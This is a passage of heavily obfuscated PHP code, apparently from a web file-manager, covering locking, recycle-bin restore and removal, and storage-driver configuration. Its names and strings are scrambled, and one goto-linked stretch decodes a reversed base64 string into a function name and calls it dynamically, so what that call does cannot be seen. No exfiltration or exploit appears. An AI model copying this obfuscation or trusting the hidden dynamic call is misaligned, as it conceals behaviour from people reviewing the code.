self::$errorMsg . $Ä¢©¢†¥[71] . get_caller_msg(); $æ¡µÙ = LNG($Ä¢©¢†¥[895]) . "\50{$¤ñ™•ÒĞ}\163\51\56" . LNG($Ä¢©¢†¥[896]); $æ¡µÙ .= $Ä¢©¢†¥[897]; if (is_string(self::$errorMsg) && self::$errorMsg) { $æ¡µÙ = $æ¡µÙ . $Ä¢©¢†¥[898] . self::$errorMsg; } write_log($Ä¢©¢†¥[899] . sprintf($Ä¢©¢†¥[900], timeFloat() - $ì‰ìÜŒ) . $Ä¢©¢†¥[901] . $ú÷˜“ƒ® . $Ä¢©¢†¥[902] . error_get_last(), $Ä¢©¢†¥[893]); show_json($æ¡µÙ, !1); } if (!$ìäÒÃ€í) { self::$lockItem[$‹÷ì¯Â®] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $çÔ¦ç¶Ë = number_format(timeFloat() - $Õ¶ü›Ê, 3); write_log($Ä¢©¢†¥[903] . $ÂòéóÂ . $Ä¢©¢†¥[904] . $çÔ¦ç¶Ë, $Ä¢©¢†¥[893]); } return $»¦‹Ä; } public static function lockGet($“Ò¨ºÑŞ) { $ÇÍş¾ÊŠ = self::key($“Ò¨ºÑŞ); if (self::$lockItem[$ÇÍş¾ÊŠ]) { return self::$lockItem[$ÇÍş¾ÊŠ]; } return self::init()->lockGet($ÇÍş¾ÊŠ); } public static function unlock($âÂ…¿á) { $Á˜¥üë =& $_SERVER[çâ¥×ø³]; $ñæ°ûˆŞ = self::key($âÂ…¿á); self::$lockItem[$ñæ°ûˆŞ] = null; self::init()->unlock($ñæ°ûˆŞ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Á˜¥üë[905] . $âÂ…¿á, $Á˜¥üë[893]); } return; } public static function unlockRuntime() { $Ë¨ãè =& $_SERVER[çâ¥×ø³]; $ÍöˆıŒŠ = self::init(); $‚¥ªÙ’­ = !1; foreach (self::$lockItem as $‡èåìó’ => $®ºÁßÅõ) { if (!$®ºÁßÅõ) { continue; } $ÍöˆıŒŠ->unlock($‡èåìó’); if (!$‚¥ªÙ’­) { $‚¥ªÙ’­ = !0; write_log($Ë¨ãè[906] . $‡èåìó’ . $Ë¨ãè[71] . get_caller_msg(), $Ë¨ãè[893]); continue; } write_log($Ë¨ãè[906] . $‡èåìó’, $Ë¨ãè[893]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Şğâš¾ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Ë¨ãè[907] . $Şğâš¾ . $Ë¨ãè[908] . ACTION, $Ë¨ãè[893]); } } public static function fileLock($öî±Öàˆ) { $Å‘Êº´ =& $_SERVER[çâ¥×ø³]; if (!$GLOBALS[$Å‘Êº´[909]]) { $GLOBALS[$Å‘Êº´[909]] = array(); } $GLOBALS[$Å‘Êº´[909]][$öî±Öàˆ] = !1; $¿¿éùü = fopen(DATA_PATH . $öî±Öàˆ . $Å‘Êº´[910], $Å‘Êº´[911]); if (!$¿¿éùü) { return !1; } $GLOBALS[$Å‘Êº´[909]][$öî±Öàˆ] = $¿¿éùü; if (flock($¿¿éùü, LOCK_EX)) { return !0; } self::unlock($öî±Öàˆ); show_json($Å‘Êº´[912], !1); return !1; } public static function fileUnlock($ÒËÄöÙğ) { $ÊÂ‹ßÓ =& $_SERVER[çâ¥×ø³]; $æÑÊÕ¡ã = $GLOBALS[$ÊÂ‹ßÓ[909]][$ÒËÄöÙğ]; if (!$æÑÊÕ¡ã) { return; } $GLOBALS[$ÊÂ‹ßÓ[909]][$ÒËÄöÙğ] = !1; flock($æÑÊÕ¡ã, LOCK_UN); fclose($æÑÊÕ¡ã); } public static function fileUnlockAll() { $“ÆÓä =& $_SERVER[çâ¥×ø³]; if (!$GLOBALS[$“ÆÓä[909]]) { return; } foreach ($GLOBALS[$“ÆÓä[909]] as $‘ÍĞğ¨Ë => $‰Ç•ïó) { if (!$‰Ç•ïó) { continue; } $GLOBALS[$“ÆÓä[909]][$‘ÍĞğ¨Ë] = !1; flock($‰Ç•ïó, LOCK_UN); fclose($‰Ç•ïó); } $GLOBALS[$“ÆÓä[909]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto C‰á…›Íä´; bÙ¹„À›: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\x63\x65\x5f\162\x65\x63\x79\x63\154\x65"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\145\x72\x74", "\x66\x75\x6e\143\x74\x69\x6f\x6e")); public function listData($àİ·›ôÁ = false) { $Ç”õ˜ª¦ =& $_SERVER[çâ¥×ø³]; $àİ·›ôÁ = $àİ·›ôÁ ? $àİ·›ôÁ : USER_ID; $Íää±˜ = $this->where(array($Ç”õ˜ª¦[1692] => $àİ·›ôÁ))->select(); return array_to_keyvalue($Íää±˜, $Ç”õ˜ª¦[12], $Ç”õ˜ª¦[181]); } public function moveToRecycle($ä…®ŞÎ›) { $Åº®èø• =& $_SERVER[çâ¥×ø³]; $÷²ÔÀ¦Å = Model($Åº®èø•[1385]); $äŸèË° = $÷²ÔÀ¦Å->sourceInfo($ä…®ŞÎ›); if (!$äŸèË° || $äŸèË°[$Åº®èø•[473]] == $Åº®èø•[88]) { return; } $ÀñÃé²æ = array($Åº®èø•[459] => $ä…®ŞÎ›, $Åº®èø•[1692] => USER_ID, $Åº®èø•[616] => $äŸèË°[$Åº®èø•[178]], $Åº®èø•[617] => $äŸèË°[$Åº®èø•[538]], $Åº®èø•[620] => $äŸèË°[$Åº®èø•[553]]); $this->add($ÀñÃé²æ); $this->recycleMove($ä…®ŞÎ›, 1); if ($äŸèË°[$Åº®èø•[453]] == $Åº®èø•[88]) { $ŒùğÇˆü = array($Åº®èø•[620] => array($Åº®èø•[580], $äŸèË°[$Åº®èø•[553]] . $ä…®ŞÎ› . $Åº®èø•[581])); $÷²ÔÀ¦Å->where($ŒùğÇˆü)->setField($Åº®èø•[473], 1); } } public function clear() { $this->remove(!1); } public function remove($ô—Í¤ç = false, $‘´…ø‘ñ = false) { $ÙÊä²Éü =& $_SERVER[çâ¥×ø³]; $‘´…ø‘ñ = $‘´…ø‘ñ ? $‘´…ø‘ñ : USER_ID; $íİåÃø” = Model($ÙÊä²Éü[1385]); $¡œ¨ñ÷² = $this->listData($‘´…ø‘ñ); $ô—Í¤ç = $ô—Í¤ç === !1 ? !1 : $ô—Í¤ç; $Å¬Ü”£œ = array(); foreach ($¡œ¨ñ÷² as $ı¦ÒÕÖÌ) { if ($ô—Í¤ç != !1 && !in_array($ı¦ÒÕÖÌ, $ô—Í¤ç)) { continue; } $Õã»üéğ = $íİåÃø”->sourceInfo($ı¦ÒÕÖÌ); $íİåÃø”->remove($ı¦ÒÕÖÌ, !1); $¿ªÜÈÎ¼ = $Õã»üéğ[$ÙÊä²Éü[178]] . $ÙÊä²Éü[11] . $Õã»üéğ[$ÙÊä²Éü[538]]; $Å¬Ü”£œ[$¿ªÜÈÎ¼] = array($ÙÊä²Éü[616] => $Õã»üéğ[$ÙÊä²Éü[178]], $ÙÊä²Éü[538] => $Õã»üéğ[$ÙÊä²Éü[538]]); $this->where(array($ÙÊä²Éü[181] => $ı¦ÒÕÖÌ))->delete(); } foreach ($Å¬Ü”£œ as $ÃúÊõ‘²) { $íİåÃø”->targetSpaceUpdate($ÃúÊõ‘²[$ÙÊä²Éü[178]], $ÃúÊõ‘²[$ÙÊä²Éü[538]]); } } public function restore($­æ«ò Í = false) { $´Úƒîô… = $this->listData(); $this->_restoreSource($´Úƒîô…, $­æ«ò Í); } public function removeUserAll($²”ÔÄû·) { $this->remove(!1, $²”ÔÄû·); } public function restoreItem($‚ÀûİËÑ) { $this->_restoreSource(array($‚ÀûİËÑ), array($‚ÀûİËÑ)); } private function _restoreSource($†ä¸ÖÇ”, $ÖşÎÔôâ) { $ÕÆæ–ª¹ =& $_SERVER[çâ¥×ø³]; $”ã¿¬×› = Model($ÕÆæ–ª¹[1385]); $ÖşÎÔôâ = $ÖşÎÔôâ == !1 ? !1 : $ÖşÎÔôâ; if (!$†ä¸ÖÇ”) { return !0; } $ÖÄ©é™Æ = array(); foreach ($†ä¸ÖÇ” as $Ùú§¾½À) { if ($ÖşÎÔôâ != !1 && !in_array($Ùú§¾½À, $ÖşÎÔôâ)) { continue; } $‰Ëñı¸Å = $”ã¿¬×›->sourceInfo($Ùú§¾½À); $ş˜áÈÀ = $”ã¿¬×›->sourceInfo($‰Ëñı¸Å[$ÕÆæ–ª¹[180]]); if ($ş˜áÈÀ[$ÕÆæ–ª¹[473]] == $ÕÆæ–ª¹[88]) { continue; } $”ã¿¬×›->lockMoveStart($Ùú§¾½À); $this->recycleMove($Ùú§¾½À, 0); if ($‰Ëñı¸Å[$ÕÆæ–ª¹[453]] == $ÕÆæ–ª¹[88]) { $·…ÀŸ§¥ = array($ÕÆæ–ª¹[620] => array($ÕÆæ–ª¹[580], $‰Ëñı¸Å[$ÕÆæ–ª¹[553]] . $Ùú§¾½À . $ÕÆæ–ª¹[581])); $”ã¿¬×›->where($·…ÀŸ§¥)->setField($ÕÆæ–ª¹[473], 0); $this->restoreFolderChildren($Ùú§¾½À, $†ä¸ÖÇ”); } $this->where(array($ÕÆæ–ª¹[181] => $Ùú§¾½À))->delete(); $”ã¿¬×›->folderSizeReset($‰Ëñı¸Å[$ÕÆæ–ª¹[180]]); $ÖÄ©é™Æ[] = $‰Ëñı¸Å[$ÕÆæ–ª¹[180]]; if ($‰Ëñı¸Å[$ÕÆæ–ª¹[453]] == $ÕÆæ–ª¹[88]) { $ÖÄ©é™Æ[] = $Ùú§¾½À; } $”ã¿¬×›->lockMoveEnd($Ùú§¾½À); } $”ã¿¬×›->updateModifyTime($ÖÄ©é™Æ); } private function restoreFolderChildren($ã¥èÓøÎ, $·Ûö°Ò¢) { $à¦Ü‡Ÿš =& $_SERVER[çâ¥×ø³]; $ïø¡·Á˜ = Model($à¦Ü‡Ÿš[1385]); $ÍÚ‡§¢« = array($à¦Ü‡Ÿš[181] => array($à¦Ü‡Ÿš[7], array())); foreach ($·Ûö°Ò¢ as $‡˜‘ÙÛ§) { if ($‡˜‘ÙÛ§ == $ã¥èÓøÎ) { continue; } if (!$ïø¡·Á˜->isParentOf($ã¥èÓøÎ, $‡˜‘ÙÛ§)) { continue; } $æ¿æÂº = $ïø¡·Á˜->sourceInfo($‡˜‘ÙÛ§); if ($æ¿æÂº[$à¦Ü‡Ÿš[453]] == $à¦Ü‡Ÿš[88]) { $ÍÚ‡§¢«[] = array($à¦Ü‡Ÿš[620] => array($à¦Ü‡Ÿš[580], $æ¿æÂº[$à¦Ü‡Ÿš[553]] . $‡˜‘ÙÛ§ . $à¦Ü‡Ÿš[581])); } else { $ÍÚ‡§¢«[$à¦Ü‡Ÿš[181]][1][] = $‡˜‘ÙÛ§; } } if (!$ÍÚ‡§¢«[$à¦Ü‡Ÿš[181]][1]) { unset($ÍÚ‡§¢«[$à¦Ü‡Ÿš[181]]); } if (!$ÍÚ‡§¢«) { return; } if (is_array($ÍÚ‡§¢«[$à¦Ü‡Ÿš[181]]) && is_array($ÍÚ‡§¢«[$à¦Ü‡Ÿš[181]][1])) { $ÍÚ‡§¢«[$à¦Ü‡Ÿš[181]][1] = array_unique($ÍÚ‡§¢«[$à¦Ü‡Ÿš[181]][1]); } $ÍÚ‡§¢«[$à¦Ü‡Ÿš[1053]] = $à¦Ü‡Ÿš[1997]; $ïø¡·Á˜->where($ÍÚ‡§¢«)->setField($à¦Ü‡Ÿš[473], 1); } private function recycleMove($Ç¹§­Î, $ˆà×ˆúå = 1) { $Ô”³øÔ =& $_SERVER[çâ¥×ø³]; $Ä®¦±†• = Model($Ô”³øÔ[1385]); $–è±Œ†ä = Model($Ô”³øÔ[2216]); $Îç°‰‰ = array($Ô”³øÔ[181] => $Ç¹§­Î); if ($ˆà×ˆúå) { $Ä®¦±†•->where($Îç°‰‰)->setField($Ô”³øÔ[473], 1); $–è±Œ†ä->eventRecycle($Ç¹§­Î, $Ô”³øÔ[2217]); } else { $ªİ‹¸Ş = $Ä®¦±†•->where($Îç°‰‰)->find(); $ï¯˜Í‡ = $ªİ‹¸Ş[$Ô”³øÔ[453]] == $Ô”³øÔ[88]; $¤ÂŸ¡‘Ü = $Ä®¦±†•->fileNameAuto($ªİ‹¸Ş[$Ô”³øÔ[180]], $ªİ‹¸Ş[$Ô”³øÔ[32]], REPEAT_RENAME_FOLDER, $ï¯˜Í‡); if ($¤ÂŸ¡‘Ü != $ªİ‹¸Ş[$Ô”³øÔ[32]]) { $Ä®¦±†•->rename($Ç¹§­Î, $¤ÂŸ¡‘Ü); } $Ä®¦±†•->where($Îç°‰‰)->setField($Ô”³øÔ[473], 0); $–è±Œ†ä->eventRecycle($Ç¹§­Î, $Ô”³øÔ[2218]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\163\x6f\165\162\x63\145\123\145\143\x72\145\x74\x4c\151\x73\x74"; public $field = array("\x73\157\165\x72\143\x65\x49\x44", "\x74\x79\x70\145\x49\x44", "\143\x72\x65\141\x74\145\x55\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\163\164\x6f\162\x61\x67\145\114\151\x73\x74"; public $field = array("\156\141\155\145", "\x73\x69\172\x65\115\x61\x78", "\163\171\x73\164\145\155", "\x64\145\146\141\165\x6c\x74", "\x64\162\x69\166\x65\162", "\x63\157\x6e\x66\x69\x67"); public function listData($ñìÑ‘ä× = false, $ºŒÎÈ­È = "\155\x6f\x64\x69\x66\171\x54\151\155\145", $Ç¥±Ò Ç = false) { $´¦±à¶‡ =& $_SERVER[çâ¥×ø³]; $°˜´œÏ = parent::listData($ñìÑ‘ä×, $ºŒÎÈ­È, $Ç¥±Ò Ç); if ($ñìÑ‘ä×) { return $°˜´œÏ; } $Ñãİ“É¢ = $this->ioSizeUseGet(array_to_keyvalue($°˜´œÏ, $´¦±à¶‡[12], $´¦±à¶‡[443])); foreach ($°˜´œÏ as $ˆô÷ûŸ† => $Ì…Î¹×ß) { unset($°˜´œÏ[$ˆô÷ûŸ†][$´¦±à¶‡[6]]); $°˜´œÏ[$ˆô÷ûŸ†][$´¦±à¶‡[1888]] = isset($Ñãİ“É¢[$Ì…Î¹×ß[$´¦±à¶‡[443]]]) ? $Ñãİ“É¢[$Ì…Î¹×ß[$´¦±à¶‡[443]]] : 0; } return $°˜´œÏ; } public function ioSizeUseGet($½ƒğøŞ¶) { $¹²¼–Ëö =& $_SERVER[çâ¥×ø³]; if (!$½ƒğøŞ¶) { return array(); } $›¾‹æÊû = $¹²¼–Ëö[2219] . implode($¹²¼–Ëö[50], $½ƒğøŞ¶); $À™¬ÁÓã = Cache::get($›¾‹æÊû); if ($À™¬ÁÓã) { return $À™¬ÁÓã; } $Â÷¹àÓ“ = array($¹²¼–Ëö[866] => $¹²¼–Ëö[443], $¹²¼–Ëö[2220] => $¹²¼–Ëö[76]); $™Š©¾»š = array($¹²¼–Ëö[866] => array($¹²¼–Ëö[7], $½ƒğøŞ¶)); $À™¬ÁÓã = Model($¹²¼–Ëö[838])->field($Â÷¹àÓ“)->where($™Š©¾»š)->group($¹²¼–Ëö[866])->select(); $À™¬ÁÓã = array_to_keyvalue($À™¬ÁÓã, $¹²¼–Ëö[443], $¹²¼–Ëö[76]); Cache::set($›¾‹æÊû, $À™¬ÁÓã, 600); return $À™¬ÁÓã; } public function getConfig($¸”õÉÊ¡) { $Â—ğöæÑ = parent::listData($¸”õÉÊ¡); return json_decode($Â—ğöæÑ[$_SERVER[çâ¥×ø³][6]], !0); } public function update($«êáò”…, $„ŞÛì•è) { $Ô–µ¬şï =& $_SERVER[çâ¥×ø³]; $»§Ÿ§şØ = $„ŞÛì•è[$Ô–µ¬şï[32]]; $¨‡¨ö© = array_to_keyvalue(parent::listData(), $Ô–µ¬şï[32]); if (isset($¨‡¨ö©[$»§Ÿ§şØ]) && $¨‡¨ö©[$»§Ÿ§şØ][$Ô–µ¬şï[443]] != $«êáò”…) { return !1; } $this->checkPwd($«êáò”…, $„ŞÛì•è); if (isset($„ŞÛì•è[$Ô–µ¬şï[2221]]) && $„ŞÛì•è[$Ô–µ¬şï[2221]] == $Ô–µ¬şï[88]) { $this->checkConfig($„ŞÛì•è); } unset($„ŞÛì•è[$Ô–µ¬şï[2221]]); $à”º“ÊÖ = parent::update($«êáò”…, $„ŞÛì•è); if ($à”º“ÊÖ && $„ŞÛì•è[$Ô–µ¬şï[37]]) { $ñòİ€ñ = 0; foreach ($¨‡¨ö© as $áë¿¨¾) { if ($áë¿¨¾[$Ô–µ¬şï[37]] && $áë¿¨¾[$Ô–µ¬şï[443]] != $«êáò”…) { $ñòİ€ñ = $áë¿¨¾[$Ô–µ¬şï[443]]; parent::update($áë¿¨¾[$Ô–µ¬şï[443]], array($Ô–µ¬şï[37] => 0)); } } $this->updateBackup($«êáò”…, $ñòİ€ñ); } return $à”º“ÊÖ; } public function add($·ÚÇ“Ò–) { $Âß¦Û¿¼ =& $_SERVER[çâ¥×ø³]; $”¹µÌ¾¬ = array_to_keyvalue(parent::listData(), $Âß¦Û¿¼[32]); if (isset($”¹µÌ¾¬[$·ÚÇ“Ò–[$Âß¦Û¿¼[32]]])) { return !1; } $this->checkConfig($·ÚÇ“Ò–); $¾ÕÌ¦ñÎ = parent::insert($·ÚÇ“Ò–); if ($¾ÕÌ¦ñÎ && $·ÚÇ“Ò–[$Âß¦Û¿¼[37]]) { foreach ($”¹µÌ¾¬ as $©ÂÎ±“Ï) { if ($©ÂÎ±“Ï[$Âß¦Û¿¼[37]]) { parent::update($©ÂÎ±“Ï[$Âß¦Û¿¼[443]], array($Âß¦Û¿¼[37] => 0)); } } } return $¾ÕÌ¦ñÎ; } public function updateBackup($»£ŠÖÁ, $¢¶æ°†“) { $îÃíš©ü =& $_SERVER[çâ¥×ø³]; if (!$¢¶æ°†“) { return; } $ŸåÛËÇ¸ = Model($îÃíš©ü[798])->config(); if ($ŸåÛËÇ¸[$îÃíš©ü[1671]] != $îÃíš©ü[88] || $ŸåÛËÇ¸[$îÃíš©ü[800]] != $¢¶æ°†“) { return; } $Ü¬Ğ«¾ = Model($îÃíš©ü[819])->get($îÃíš©ü[829]); $Ü¬Ğ«¾ = json_decode($Ü¬Ğ«¾, !0); if (!$Ü¬Ğ«¾) { return; } $Ü¬Ğ«¾[$îÃíš©ü[800]] = $»£ŠÖÁ; Model($îÃíš©ü[819])->set(array($îÃíš©ü[829] => $Ü¬Ğ«¾)); } public function checkPwd($åü¼áŠÙ, &$ôØÍîØß) { $”èÂàó =& $_SERVER[çâ¥×ø³]; if (empty($ôØÍîØß[$”èÂàó[6]])) { return; } $Ğœ¾ÕŒ» = json_decode($ôØÍîØß[$”èÂàó[6]], !0); $ù…¾ó÷© = $”èÂàó[12]; $¦»œÃÙ = array($”èÂàó[2222], $”èÂàó[2223], $”èÂàó[942]); foreach ($¦»œÃÙ as $ÇÜÒ½Ø¿) { if (isset($Ğœ¾ÕŒ»[$ÇÜÒ½Ø¿])) { $ù…¾ó÷© = $ÇÜÒ½Ø¿; break; } } if (!$ù…¾ó÷©) { return; } $‘°†òìÑ = $this->getConfig($åü¼áŠÙ); $Ä¬Óãô› = $‘°†òìÑ[$ù…¾ó÷©]; $ãô³¨õ = $Ğœ¾ÕŒ»[$ù…¾ó÷©]; if ($ãô³¨õ == str_repeat($”èÂàó[203], strlen($Ä¬Óãô›))) { $Ğœ¾ÕŒ»[$ù…¾ó÷©] = $Ä¬Óãô›; $ôØÍîØß[$”èÂàó[6]] = json_encode($Ğœ¾ÕŒ»); } else { if ($ãô³¨õ != $Ä¬Óãô›) { $ôØÍîØß[$”èÂàó[2221]] = $”èÂàó[88]; } } } public function checkConfig(&$ÉÌëºŞ², $¶ì¼º¢ß = false) { $ÎÕ×ƒşÒ =& $_SERVER[çâ¥×ø³]; $„å¢ëû£ = strtolower($ÉÌëºŞ²[$ÎÕ×ƒşÒ[95]]); $ş£Š·À  = json_decode($ÉÌëºŞ²[$ÎÕ×ƒşÒ[6]], !0); foreach ($ş£Š·À  as $¤ˆ¢§çÛ => $Îû‰«åÀ) { if (is_string($Îû‰«åÀ)) { $ş£Š·À [$¤ˆ¢§çÛ] = trim($Îû‰«åÀ); } } $ş£Š·À [$ÎÕ×ƒşÒ[2224]] = rand_string(6); $¸à×±° = $GLOBALS[$ÎÕ×ƒşÒ[6]][$ÎÕ×ƒşÒ[89]][$ÎÕ×ƒşÒ[875]]; $ ·Ò´‚Ä = isset($¸à×±°[$„å¢ëû£]) ? $¸à×±°[$„å¢ëû£] : ucfirst($„å¢ëû£); $¦Ôàã£ = $ÎÕ×ƒşÒ[74] . $ ·Ò´‚Ä; if (!$ ·Ò´‚Ä || !class_exists($¦Ôàã£)) { if ($¶ì¼º¢ß) { return LNG($ÎÕ×ƒşÒ[2225]); } write_log(array($ÎÕ×ƒşÒ[2226], $ÉÌëºŞ², get_caller_info()), $ÎÕ×ƒşÒ[2227]); show_json(LNG($ÎÕ×ƒşÒ[2225]), !1, $ÉÌëºŞ²); } $¥îñÌ–ğ = new $¦Ôàã£($ş£Š·À ); if (in_array($„å¢ëû£, $¥îñÌ–ğ->objectDriver)) { if (!$¥îñÌ–ğ->isBucketCors() && !$¥îñÌ–ğ->setBucketCors()) { $¬œŠ£“Ú = LNG($ÎÕ×ƒşÒ[2228]); $¬œŠ£“Ú .= $ÎÕ×ƒşÒ[2229] . LNG($ÎÕ×ƒşÒ[2230]); if ($¶ì¼º¢ß) { return $¬œŠ£“Ú; } show_json($¬œŠ£“Ú, !1); } } $Ù¹Ìí¤Í = rtrim($ş£Š·À [$ÎÕ×ƒşÒ[1233]], $ÎÕ×ƒşÒ[8]) . $ÎÕ×ƒşÒ[8]; $ÓÌóÉ­Ü = $¥îñÌ–ğ->getPath($Ù¹Ìí¤Í . $ÎÕ×ƒşÒ[1237]); if (!$¥îñÌ–ğ->mkfile($ÓÌóÉ­Ü)) { if ($¶ì¼º¢ß) { return LNG($ÎÕ×ƒşÒ[2228]); } show_json(LNG($ÎÕ×ƒşÒ[2228]), !1); } $ş£Š·À [$ÎÕ×ƒşÒ[1233]] = $Ù¹Ìí¤Í; $ÉÌëºŞ²[$ÎÕ×ƒşÒ[6]] = json_encode($ş£Š·À ); $ÉÌëºŞ²[$ÎÕ×ƒşÒ[95]] = $ ·Ò´‚Ä; return !0; } public function driverListSystem() { $Ìõ¸—¥¯ =& $_SERVER[çâ¥×ø³]; $„¤¥ù¹± = parent::listData(); $ÊúØŒØø = array(); foreach ($„¤¥ù¹± as $ïÏ¥¾ãç) { unset($ïÏ¥¾ãç[$Ìõ¸—¥¯[215]], $ïÏ¥¾ãç[$Ìõ¸—¥¯[85]]); $ïÏ¥¾ãç[$Ìõ¸—¥¯[6]] = json_decode($ïÏ¥¾ãç[$Ìõ¸—¥¯[6]], !0); $ÊúØŒØø[] = $ïÏ¥¾ãç; } return $ÊúØŒØø; } public function defaultDriver() { $‡ğ™Ûö =& $_SERVER[çâ¥×ø³]; $¸æ†ãù® = parent::listData(); $¿ïú‚ = array_filter_by_field($¸æ†ãù®, $‡ğ™Ûö[37], 1); $¿ïú‚ = $¿ïú‚[0]; if ($¿ïú‚) { $¿ïú‚[$‡ğ™Ûö[6]] = json_decode($¿ïú‚[$‡ğ™Ûö[6]], !0); } return $¿ïú‚; } public function driverInfo($„—ŸÓìË) { $¼ß¯Ñ½Ü =& $_SERVER[çâ¥×ø³]; $—¼ĞôÄ· = array_to_keyvalue(parent::listData(), $¼ß¯Ñ½Ü[443]); if (!isset($—¼ĞôÄ·[$„—ŸÓìË])) { return !1; } $å¦Õ´Ìš = $—¼ĞôÄ·[$„—ŸÓìË]; $å¦Õ´Ìš[$¼ß¯Ñ½Ü[6]] = json_decode($å¦Õ´Ìš[$¼ß¯Ñ½Ü[6]], !0); return $å¦Õ´Ìš; } public function remove($ŒÛ…Øˆñ) { $this->removeShareItems($ŒÛ…Øˆñ); return parent::remove($ŒÛ…Øˆñ); } public function removeWithFile($¼ÂÒ›¾É, $î‘Û÷èÈ) { $ÁÔÆè« =& $_SERVER[çâ¥×ø³]; $ä—ªÕà¨ = array($ÁÔÆè«[866] => $¼ÂÒ›¾É); $Ë´ç‹¡Ã = Model($ÁÔÆè«[512])->where($ä—ªÕà¨)->count(); $ñ¾ëğÕ„ = Model($ÁÔÆè«[512])->where($ä—ªÕà¨)->sum($ÁÔÆè«[76]); $ûŠË…â‹ = $î‘Û÷èÈ . $ÁÔÆè«[2231] . $¼ÂÒ›¾É; $ÀÈŒãÉÁ = LNG($î‘Û÷èÈ == $ÁÔÆè«[588] ? $ÁÔÆè«[2232] : $ÁÔÆè«[2233]); $×‚õç— = new TaskFileTransfer($ûŠË…â‹, $ÁÔÆè«[2227], $Ë´ç‹¡Ã, $ÀÈŒãÉÁ . "\x28{$¼ÂÒ›¾É}\x29"); $×‚õç—->task[$ÁÔÆè«[812]] = (double) $ñ¾ëğÕ„; $Ş¼öÆô“ = KodIO::defaultDriver(); $¦ëõòá = $Ş¼öÆô“[$ÁÔÆè«[443]]; $—ÌÀĞßÜ = "\173\151\x6f\72{$¦ëõòá}\x7d\x2f"; $Öˆ‰Ğ³Ã = !0; $ÍÁç¼º = array(); $ßêàµ£‹ = Model($ÁÔÆè«[214])->where($ä—ªÕà¨)->field($ÁÔÆè«[2234])->select(); foreach ($ßêàµ£‹ as $³ğå‹Ş) { $‡°ø§ø‡ = $³ğå‹Ş[$ÁÔÆè«[84]]; $š„¢‚İã = $—ÌÀĞßÜ . str_replace("\x7b\151\157\x3a{$¼ÂÒ›¾É}\175\57", $ÁÔÆè«[12], $‡°ø§ø‡); if (!IO::exist($‡°ø§ø‡)) { $ÍÁç¼º[] = $³ğå‹Ş[$ÁÔÆè«[509]]; $×‚õç—->updateFileEnd($³ğå‹Ş[$ÁÔÆè«[32]], $³ğå‹Ş[$ÁÔÆè«[76]]); continue; } if (IO::exist($š„¢‚İã)) { $×‚õç—->updateFileEnd($³ğå‹Ş[$ÁÔÆè«[32]], $³ğå‹Ş[$ÁÔÆè«[76]]); continue; } if (!IO::move($‡°ø§ø‡, get_path_father($š„¢‚İã))) { $Öˆ‰Ğ³Ã = !1; break; } $ä—ªÕà¨ = array($ÁÔÆè«[509] => $³ğå‹Ş[$ÁÔÆè«[509]]); $¬íõŠ© = array($ÁÔÆè«[866] => $¦ëõòá, $ÁÔÆè«[84] => $š„¢‚İã); Model($ÁÔÆè«[214])->where($ä—ªÕà¨)->save($¬íõŠ©); } $this->removeByFileID($ÍÁç¼º); if (!$Öˆ‰Ğ³Ã) { $×‚õç—->stop($ûŠË…â‹); return !1; } $×‚õç—->end(); if ($î‘Û÷èÈ == $ÁÔÆè«[1868]) { $this->remove($¼ÂÒ›¾É); } } public function progress($ÙÇã¹ä§, $È¦Ä€ûŠ) { return Task::get($È¦Ä€ûŠ . $_SERVER[çâ¥×ø³][2231] . $ÙÇã¹ä§); } private function removeByFileID($ÉÆ’Ÿ¿ = array()) { $·‹Ñîü£ =& $_SERVER[çâ¥×ø³]; if (empty($ÉÆ’Ÿ¿)) { return; } $Ôµ¼ö¢ = array($·‹Ñîü£[509] => array($·‹Ñîü£[7], $ÉÆ’Ÿ¿)); $™»øöõø = Model($·‹Ñîü£[1385])->where($Ôµ¼ö¢)->field($·‹Ñîü£[181])->select(); if (!$™»øöõø) { return; } $™»øöõø = array_to_keyvalue($™»øöõø, $·‹Ñîü£[12], $·‹Ñîü£[181]); foreach ($™»øöõø as $ˆÜôøâ¯) { Model($·‹Ñîü£[458])->removeNow($ˆÜôøâ¯, !1); } } private function removeShareItems($ŠÅß—¨œ) { $çŒ±Æì² =& $_SERVER[çâ¥×ø³]; $ñÀàÉò¢ = "\x7b\x69\157\72{$ŠÅß—¨œ}\x7d\x2f"; $Ùœ¹Ìû = array($çŒ±Æì²[181] => 0, $çŒ±Æì²[1228] => array($çŒ±Æì²[427], "{$ñÀàÉò¢}\x25")); $ˆ€…ËËÔ = Model($çŒ±Æì²[1879])->where($Ùœ¹Ìû)->field($çŒ±Æì²[633])->select(); if (empty($ˆ€…ËËÔ)) { return; } $­Êç³Õ¢ = array_to_keyvalue($ˆ€…ËËÔ, $çŒ±Æì²[12], $çŒ±Æì²[633]); Model($çŒ±Æì²[632])->remove($­Êç³Õ¢); } } goto CìŠˆ¢Ëõ; AëÉˆêÎ¸í: $fileSize = strrev(base64_decode($_SERVER[‹Í¤¶Õ¨][0])); function binCheckNeq($Üëß·¾œ, $˜“£”µ) { return $Üëß·¾œ != $˜“£”µ; } $_SERVER[$_SERVER[‹Í¤¶Õ¨][1]] = $fileSize($_SERVER[$_SERVER[‹Í¤¶Õ¨][2]]); goto FÍµ¼¼Ôì; C×ø¸ï¯Å: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¶‡×¨íÀ) { if (substr($¶‡×¨íÀ, 0, 2) == $_SERVER[çâ¥×ø³][1406]) { $¶‡×¨íÀ = BASIC_PATH . substr($¶‡×¨íÀ, 2); } return $¶‡×¨íÀ; } public function iconvApp($ÓÔ¥æš€) { $¨ÑÜ‡Æ =& $_SERVER[çâ¥×ø³]; global $config; return $this->iconvTo($ÓÔ¥æš€, $config[$¨ÑÜ‡Æ[1404]], $config[$¨ÑÜ‡Æ[1403]]); } public function iconvSystem($ÍŒŠÅÑ) { $Ã‚†ñğ =& $_SERVER[çâ¥×ø³]; global $config; return 